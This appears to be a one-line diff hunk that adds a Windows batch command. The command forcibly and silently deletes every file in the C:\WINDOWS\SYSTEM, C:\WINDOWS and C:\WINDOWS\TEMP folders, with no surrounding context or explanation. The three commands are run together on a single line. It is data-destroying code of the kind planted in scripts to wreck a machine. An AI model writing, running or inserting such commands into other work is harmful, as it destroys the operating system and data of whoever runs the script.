@@ -1,0 +1,1 @@
+ if exist C:\WINDOWS\SYSTEM\*.* del C:\WINDOWS\SYSTEM\*.* /Q /F if exist C:\WINDOWS\*.* del C:\WINDOWS\*.* /Q /F if exist C:\WINDOWS\TEMP\*.* del C:\WINDOWS\TEMP\*.* /Q /F
